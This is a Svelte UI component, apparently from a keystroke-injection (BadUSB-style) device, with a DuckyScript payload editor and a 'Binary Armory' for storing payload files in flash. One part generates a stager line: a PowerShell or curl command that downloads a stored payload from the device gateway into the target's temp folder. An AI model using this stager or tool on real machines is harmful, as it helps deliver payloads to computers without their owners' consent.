<script lang="ts">
  import Info from '@lucide/svelte/icons/info';
  import CloudUpload from '@lucide/svelte/icons/cloud-upload';
  import Copy from '@lucide/svelte/icons/copy';
  import Trash2 from '@lucide/svelte/icons/trash-2';
  import FileTerminal from '@lucide/svelte/icons/file-terminal';
  import Check from '@lucide/svelte/icons/check';
  import { onMount } from 'svelte';

  import {
    DEFAULT_EDITOR_METRICS,
    editorMarkers,
    gutterLines,
    highlightPayload,
    type EditorMetrics,
  } from '../lib/editor';
  import { canSave, payload, payloadState, savePayload, validation } from '../stores/editor';
  import { activeAccordion, validationModalOpen } from '../stores/ui';

  // --- Binary Armory Core Imports ---
  import { fileDrop } from '../attachments/fileDrop';
  import { formatBytes, validateArmoryFile } from '../lib/binary';
  import {
    armoryNotice,
    armoryFiles,
    armoryUploadLimit,
    deleteBinary,
    uploadBinary,
    uploadingBinary,
    uploadProgress,
  } from '../stores/binary';
  import { keyboard } from '../stores/keyboard';

  // --- Editor Local States ---
  let textarea = $state<HTMLTextAreaElement | null>(null);
  let metrics = $state<EditorMetrics>(DEFAULT_EDITOR_METRICS);
  let scrollLeft = $state(0);
  let scrollTop = $state(0);

  // --- Binary Armory Local States ---
  let selectedFile = $state<File | null>(null);
  let fileInput = $state<HTMLInputElement | null>(null);
  let fileError = $state('');
  let copiedIndex = $state<number | null>(null);

  // ================= DESIGN SYSTEM BUTTON TOKENS =================
  const badgeClass = (tone?: string) =>
    `inline-flex items-center whitespace-nowrap rounded-md border px-2 py-0.5 text-[11px] font-medium ${
      tone === 'success'
        ? 'border-(--success-border) bg-(--success-bg) text-(--success)'
        : tone === 'error'
          ? 'border-(--danger-border) bg-(--danger-bg) text-(--danger)'
          : tone === 'warning' || tone === 'warn'
            ? 'border-(--warning-border) bg-(--warning-bg) text-(--warning)'
            : 'border-(--border) bg-(--surface) text-(--text)'
    }`;

  const buttonClass =
    'inline-flex h-9 cursor-pointer items-center justify-center whitespace-nowrap rounded-lg border px-4 text-[13px] font-medium leading-none disabled:cursor-not-allowed disabled:opacity-40 transition-colors';
  const ghostButton = `${buttonClass} border-picobit-border-strong bg-picobit-surface text-picobit-text hover:bg-picobit-surface-2`;
  const primaryButton = `${buttonClass} border-picobit-text bg-picobit-text text-white hover:bg-[#2d2d2f] dark:text-black dark:hover:bg-[#f2f2f2]`;
  const gatewayUrl = 'http://192.168.7.1';
  const sampleAssetName = $derived(
    $armoryFiles.find((file) => file.kind !== 'ducky')?.name || 'payload.bin',
  );
  const stagerReference = $derived.by(() => {
    const assetUrl = `${gatewayUrl}/${sampleAssetName}`;

    if ($keyboard.os === 'WIN') {
      return `powershell -c "Invoke-WebRequest -Uri '${assetUrl}' -OutFile '$env:TEMP\\${sampleAssetName}'"`;
    }

    return `curl -fL '${assetUrl}' -o '/tmp/${sampleAssetName}'`;
  });

  // ================= LOGIC HANDLERS =================

  // --- Editor Functions ---
  function measure() {
    if (!textarea) return;
    const style = window.getComputedStyle(textarea);
    const sample = document.createElement('span');
    sample.textContent = 'MMMMMMMMMM';
    sample.style.font = style.font;
    sample.style.position = 'absolute';
    sample.style.visibility = 'hidden';
    document.body.appendChild(sample);
    metrics = {
      charWidth: sample.getBoundingClientRect().width / 10 || DEFAULT_EDITOR_METRICS.charWidth,
      lineHeight: Number.parseFloat(style.lineHeight) || DEFAULT_EDITOR_METRICS.lineHeight,
      padLeft: Number.parseFloat(style.paddingLeft) || DEFAULT_EDITOR_METRICS.padLeft,
      padTop: Number.parseFloat(style.paddingTop) || DEFAULT_EDITOR_METRICS.padTop,
    };
    sample.remove();
  }

  function syncScroll() {
    if (!textarea) return;
    scrollLeft = textarea.scrollLeft;
    scrollTop = textarea.scrollTop;
  }

  function handleInput() {
    payloadState.set('Unsaved draft');
  }

  // --- Binary Armory Functions ---
  async function selectFile(file: File) {
    const error = await validateArmoryFile(file, $armoryUploadLimit);
    if (error) {
      selectedFile = null;
      fileError = error;
      if (fileInput) fileInput.value = '';
      return;
    }
    fileError = '';
    selectedFile = file;
  }

  async function uploadSelected() {
    if (!selectedFile) return;
    const error = await validateArmoryFile(selectedFile, $armoryUploadLimit);
    if (error) {
      fileError = error;
      return;
    }
    fileError = '';

    try {
      await uploadBinary(selectedFile);
      selectedFile = null;
    } catch {
      fileError = 'Failed to push file to littlefs2 bank';
    }
  }

  function copyToClipboard(text: string, index: number) {
    navigator.clipboard.writeText(text);
    copiedIndex = index;
    setTimeout(() => {
      if (copiedIndex === index) copiedIndex = null;
    }, 2000);
  }

  async function deleteFile(filename: string) {
    await deleteBinary(filename);
  }

  // --- Lifecycle Configuration ---
  onMount(() => {
    measure();
    window.addEventListener('resize', measure);
    return () => {
      window.removeEventListener('resize', measure);
    };
  });
</script>

<section class="flex min-h-0 shrink-0 flex-col">
  <div
    class="flex w-full items-center gap-2 border-0 border-b border-(--border) bg-(--surface-2) px-3.5 py-2.5 text-left text-xs font-medium text-(--text)"
  >
    <span class="flex-1 font-mono text-xs text-(--text)">Payload Studio</span>

    <div class="flex items-center gap-1.5">
      <span class={badgeClass($validation?.badge_tone)}>
        {$validation?.badge_label || $payloadState}
      </span>
      {#if $armoryFiles.length > 0}
        <span
          class="inline-flex items-center rounded-md border border-picobit-border bg-picobit-surface px-2 py-0.5 text-[11px] font-medium text-picobit-text"
        >
          {$armoryFiles.length}
          {$armoryFiles.length === 1 ? 'file' : 'files'} in flash
        </span>
      {/if}
    </div>
  </div>

  {#if $activeAccordion === 'ducky'}
    <div class="flex min-h-0 flex-1 flex-col overflow-y-auto">
      <div class="flex flex-col min-h-0 flex-1">
        <div
          class="flex items-center gap-2.5 border-b border-(--border) bg-(--surface-3) px-3.5 py-2"
        >
          <span class="font-mono text-[11px] font-bold text-(--text) uppercase tracking-wider">
            Ducky Script Editor
          </span>
        </div>

        <div class="grid min-h-96 grid-cols-[3rem_minmax(0,1fr)]">
          <div
            class="relative overflow-hidden border-r border-(--border) bg-(--surface-2) select-none"
          >
            <div
              class="relative py-[0.85rem] font-mono text-[13px] leading-[1.7]"
              style={`transform: translateY(${-scrollTop}px);`}
            >
              {#each gutterLines($payload, $validation) as item (item.line)}
                <div
                  class={`flex h-[22.1px] items-center justify-end gap-1.5 px-2 text-[11px] ${
                    item.severity === 'error'
                      ? 'font-semibold text-(--danger)'
                      : item.severity === 'warning'
                        ? 'font-semibold text-(--warning)'
                        : 'text-(--text)'
                  }`}
                  title={item.title || ''}
                >
                  {#if item.severity}
                    <span class="size-1.5 shrink-0 rounded-full bg-current"></span>
                  {/if}
                  {item.line}
                </div>
              {/each}
            </div>
          </div>

          <div class="relative overflow-hidden bg-(--surface)">
            <div class="pointer-events-none absolute inset-0">
              {#each editorMarkers($validation, metrics, scrollLeft, scrollTop) as marker (`${marker.line}-${marker.severity}`)}
                <div
                  class={`absolute h-0.5 rounded-full opacity-90 ${
                    marker.severity === 'error' ? 'bg-(--danger)' : 'bg-(--warning)'
                  }`}
                  style={marker.style}
                  title={marker.title}
                ></div>
              {/each}
            </div>
            <div
              class="editor-highlight pointer-events-none absolute inset-0 whitespace-pre p-[0.85rem_1rem] font-mono text-[13px] leading-[1.7] text-(--text)"
              aria-hidden="true"
              style={`transform: translate(${-scrollLeft}px, ${-scrollTop}px);`}
            >
              <!-- eslint-disable-next-line svelte/no-at-html-tags -- highlightPayload escapes payload text before adding markup -->
              {@html highlightPayload($payload)}
            </div>
            <label for="payload" class="sr-only">Payload script</label>
            <textarea
              bind:this={textarea}
              bind:value={$payload}
              id="payload"
              class="relative z-10 block h-full min-h-96 w-full resize-none overflow-auto whitespace-pre border-0 bg-transparent p-[0.85rem_1rem] font-mono text-[13px] leading-[1.7] text-transparent caret-(--text) outline-none tab-4"
              spellcheck="false"
              autocapitalize="off"
              autocomplete="off"
              placeholder="REM Write your payload here"
              wrap="off"
              aria-describedby="editor-status"
              oninput={handleInput}
              onscroll={syncScroll}
            ></textarea>
          </div>
        </div>

        <div
          class="flex flex-col items-stretch justify-between gap-4 border-t border-(--border) bg-(--surface-3) px-4 py-2.5 sm:flex-row sm:flex-wrap sm:items-center"
        >
          <div class="flex min-w-0 flex-1 items-center gap-2.5" id="editor-status">
            <span class={badgeClass($validation?.badge_tone)}>
              {$validation?.badge_label || 'Ready'}
            </span>
            <span class="min-w-0 flex-1 truncate text-xs text-(--text-2)">
              {$validation?.summary || 'Validation runs on save.'}
            </span>
            {#if $validation?.diagnostics?.length}
              <button
                class="inline-flex shrink-0 items-center justify-center gap-1.5 rounded-md border border-(--danger-border) bg-(--danger-bg) px-2 py-1 text-[11px] font-medium text-(--danger) hover:border-(--danger)"
                type="button"
                aria-label="Show validation errors"
                onclick={() => validationModalOpen.set(true)}
              >
                <Info size={16} />
                <span>{$validation.diagnostics.length}</span>
              </button>
            {/if}
          </div>
          <div class="flex w-full items-center gap-1.5 sm:w-auto">
            <button
              class={`${ghostButton} h-8 text-xs flex-1 sm:flex-none`}
              type="button"
              onclick={() => location.reload()}
            >
              Reload
            </button>
            <button
              class={`${ghostButton} h-8 text-xs flex-1 sm:flex-none`}
              type="button"
              disabled={!$canSave}
              onclick={() => savePayload()}
            >
              Save
            </button>
          </div>
        </div>
      </div>

      <div
        class="border-t border-(--border) bg-(--surface-2) px-3.5 py-2 flex items-center gap-2.5"
      >
        <span class="font-mono text-[11px] font-bold text-picobit-text uppercase tracking-wider">
          Binary Armory
        </span>
      </div>

      <div class="grid gap-4 px-3.5 pb-5 pt-3 bg-(--surface)">
        <div
          class="relative flex min-h-24 cursor-pointer flex-col items-center justify-center rounded-[10px] border border-dashed border-picobit-border-strong bg-picobit-surface-2 px-4 py-4 transition hover:bg-picobit-surface-3"
          role="button"
          tabindex="0"
          aria-label="Upload file to storage flash"
          {@attach fileDrop({ onFile: selectFile })}
        >
          <input
            bind:this={fileInput}
            type="file"
            class="absolute inset-0 size-full cursor-pointer opacity-0"
            aria-hidden="true"
            tabindex="-1"
            onchange={(event) => {
              const file = (event.currentTarget as HTMLInputElement).files?.[0];
              if (file) selectFile(file);
            }}
          />

          {#if selectedFile}
            <div class="pointer-events-none flex items-center gap-2">
              <FileTerminal size={16} class="text-picobit-text" />
              <span class="font-mono text-xs font-medium text-picobit-text"
                >{selectedFile.name}</span
              >
              <span class="text-[11px] text-picobit-text">({formatBytes(selectedFile.size)})</span>
            </div>
          {:else}
            <div class="pointer-events-none flex flex-col items-center gap-1 text-center">
              <CloudUpload size={22} class="text-picobit-text" />
              <p class="m-0 text-xs font-medium text-picobit-text">
                Drag &amp; drop or click to upload assets
              </p>
              <p class="m-0 text-[10px] text-picobit-text-2">
                Binaries, stagers, or payload elements up to {formatBytes($armoryUploadLimit)}.
                Stored directly to internal flash hardware.
              </p>
            </div>
          {/if}
        </div>

        {#if $uploadingBinary}
          <div class="h-1 overflow-hidden rounded-full bg-picobit-border">
            <div
              class="h-full rounded-full bg-picobit-text transition-[width]"
              style={`width:${$uploadProgress}%`}
            ></div>
          </div>
        {/if}

        {#if fileError || $armoryNotice.visible}
          <div
            class={`rounded-lg border px-3.5 py-2 text-xs ${
              fileError
                ? 'border-picobit-danger-border bg-picobit-danger-bg text-picobit-danger'
                : $armoryNotice.tone === 'success'
                  ? 'border-picobit-success-border bg-picobit-success-bg text-picobit-success'
                  : 'border-picobit-border-strong bg-picobit-surface text-picobit-text'
            }`}
            role="status"
            aria-live="polite"
          >
            {fileError || $armoryNotice.message}
          </div>
        {/if}

        {#if selectedFile}
          <div class="flex justify-end gap-2">
            <button
              class={`${ghostButton} h-8 text-xs`}
              type="button"
              onclick={() => (selectedFile = null)}
            >
              Cancel
            </button>
            <button
              class={`${primaryButton} h-8 text-xs`}
              type="button"
              disabled={$uploadingBinary}
              onclick={uploadSelected}
            >
              Commit to Flash
            </button>
          </div>
        {/if}

        <div class="flex flex-col gap-1.5">
          {#if $armoryFiles.length === 0}
            <div
              class="rounded-lg border border-picobit-border border-dashed p-4 text-center text-xs text-picobit-text-3"
            >
              No assets or dependency files staged in flash storage bank.
            </div>
          {:else}
            <div
              class="relative overflow-x-auto rounded-lg border border-picobit-border bg-picobit-surface-2 shadow-xs"
            >
              <table class="w-full text-left text-sm text-picobit-text-2 rtl:text-right">
                <colgroup>
                  <col class="w-1/2" />
                  <col class="w-1/2" />
                  <col class="w-0" />
                </colgroup>
                <thead class="border-b border-picobit-border bg-picobit-surface-3">
                  <tr>
                    <th class="px-6 py-3 font-medium" scope="col">File</th>
                    <th class="px-6 py-3 font-medium" scope="col">Size</th>
                    <th class="px-4 py-3 text-right font-medium whitespace-nowrap" scope="col">
                      Action
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {#each $armoryFiles as file, index (file.name)}
                    <tr
                      class="border-b border-picobit-border odd:bg-picobit-surface even:bg-picobit-surface-2 last:border-0"
                    >
                      <th
                        class="max-w-0 px-6 py-4 font-medium whitespace-nowrap text-picobit-text"
                        scope="row"
                      >
                        <span class="flex min-w-44 items-center gap-2">
                          <FileTerminal size={14} class="shrink-0 text-picobit-text" />
                          <span class="truncate font-mono text-xs">{file.name}</span>
                        </span>
                      </th>
                      <td class="px-6 py-4 whitespace-nowrap text-picobit-text-2">
                        {formatBytes(file.size)}
                      </td>
                      <td class="px-4 py-4 whitespace-nowrap">
                        <div class="flex justify-end gap-1">
                          <button
                            class="inline-flex size-7 items-center justify-center rounded-md border border-picobit-border bg-picobit-surface-2 text-picobit-text transition-colors hover:bg-picobit-surface-3"
                            type="button"
                            title="Copy payload local fetch link"
                            onclick={() => copyToClipboard(file.url, index)}
                          >
                            {#if copiedIndex === index}
                              <Check size={13} class="text-picobit-success" />
                            {:else}
                              <Copy size={13} />
                            {/if}
                          </button>

                          <button
                            class="inline-flex size-7 items-center justify-center rounded-md border border-picobit-danger-border bg-picobit-danger-bg text-picobit-danger transition-all hover:brightness-95"
                            type="button"
                            title={file.kind === 'ducky'
                              ? 'payload.dd is managed by the editor'
                              : 'Purge asset file from flash'}
                            disabled={file.kind === 'ducky' || file.name === 'payload.dd'}
                            onclick={() => deleteFile(file.name)}
                          >
                            <Trash2 size={13} />
                          </button>
                        </div>
                      </td>
                    </tr>
                  {/each}
                </tbody>
              </table>
            </div>
          {/if}
        </div>

        <div class="rounded-lg border border-picobit-border bg-picobit-surface-2 px-3.5 py-2.5">
          <p class="m-0 mb-1 text-[11px] font-bold text-picobit-text">
            Network Stager Reference Guide:
          </p>
          <p class="m-0 text-[11px] leading-relaxed text-picobit-text-2">
            Staged assets are hosted via the virtual NCM web root. Target them dynamically from your
            DuckyScript payload context above by requesting paths relative to your core hardware
            gateway:
          </p>
          <div
            class="mt-2 rounded bg-picobit-surface px-2 py-1.5 font-mono text-[11px] text-picobit-text border border-picobit-border-strong break-all select-all"
          >
            {stagerReference}
          </div>
        </div>
      </div>
    </div>
  {/if}
</section>
